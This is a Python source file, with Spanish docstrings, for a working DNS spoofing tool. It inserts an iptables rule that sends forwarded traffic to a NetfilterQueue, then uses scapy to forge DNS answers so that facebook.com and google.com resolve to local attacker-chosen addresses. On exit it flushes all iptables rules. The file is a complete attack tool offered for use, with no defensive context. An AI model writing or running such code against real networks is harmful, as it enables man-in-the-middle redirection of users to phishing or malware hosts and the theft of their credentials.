from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

class DNSSpoofer:
    """Clase para realizar DNS Spoofing utilizando iptables y NetfilterQueue.

    Atributos:
        targets (dict): Diccionario con dominios y sus direcciones IP falsas.
        queue_num (int): Número de la cola de NetfilterQueue.
        queue (NetfilterQueue): Instancia de NetfilterQueue.
    """

    def __init__(self, targets=None, queue_num=0):
        """Inicializa la clase DNSSpoofer con los objetivos y el número de cola.

        Args:
            targets (dict): Diccionario con dominios y sus direcciones IP falsas.
            queue_num (int): Número de la cola de NetfilterQueue.

        Raises:
            ValueError: Si los targets no se proporcionan o no son un diccionario.
        """
        if not targets:
            raise ValueError("Los targets deben ser un diccionario de la forma {b'domain.com': '192.168.138.100'}")
        self.targets = targets
        self.queue_num = queue_num
        os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}")
        self.queue = NetfilterQueue()

    def process_packet(self, packet):
        """Procesa cada paquete capturado por la cola de NetfilterQueue.

        Si el paquete contiene una consulta DNS que coincide con uno de los
        objetivos, se modifica la respuesta DNS.

        Args:
            packet (NetfilterQueue.Packet): Paquete capturado por NetfilterQueue.
        """
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR) and scapy_packet[DNSQR].qname in self.targets:
            original_summary = scapy_packet.summary()
            scapy_packet = self.modify_packet(scapy_packet)
            modified_summary = scapy_packet.summary()
            print(f"[Modificado]: {original_summary} -> {modified_summary}")
            packet.set_payload(bytes(scapy_packet))
        packet.accept()

    def modify_packet(self, packet):
        """Modifica el paquete DNS para falsificar la respuesta.

        Args:
            packet (scapy.Packet): Paquete a modificar.

        Returns:
            scapy.Packet: Paquete modificado con la respuesta DNS falsificada.
        """
        qname = packet[DNSQR].qname
        packet[DNS].an = DNSRR(rrname=qname, rdata=self.targets[qname])
        packet[DNS].ancount = 1
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        return packet

    def run(self):
        """Inicia el proceso de DNS Spoofing y enlaza la cola de NetfilterQueue.

        Captura interrupciones del teclado para limpiar las reglas de iptables antes
        de salir.
        """
        try:
            print("Inicializando DNS Spoofer...")
            print("Dominios que se van a interceptar:")
            for domain in self.targets:
                print(f" - {domain.decode()}")
            self.queue.bind(self.queue_num, self.process_packet)
            self.queue.run()
        except KeyboardInterrupt:
            print("Deteniendo el proceso de captura y limpiando el entorno...")
            os.system("iptables --flush")

if __name__ == "__main__":
    targets = {
        b"facebook.com.": "192.168.64.8",
        b"google.com.": "192.168.138.8"
    }
    dnsspoofer = DNSSpoofer(targets=targets)
    dnsspoofer.run()